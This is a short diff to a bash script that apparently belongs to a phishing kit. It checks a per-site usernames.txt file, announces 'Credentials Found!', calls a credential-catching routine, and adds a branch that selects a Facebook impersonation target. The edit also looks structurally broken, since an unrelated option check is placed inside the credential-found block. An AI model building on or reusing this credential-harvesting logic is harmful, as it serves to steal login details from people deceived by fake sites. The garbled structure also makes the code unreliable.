@@ -437,7 +437,9 @@ sleep 0.5
 if [[ -e "sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf sites/$server/usernames.txt
+elif [[ $option == 2 || $option == 02 ]]; then
+server="facebook"
+
 fi
 sleep 0.5
 
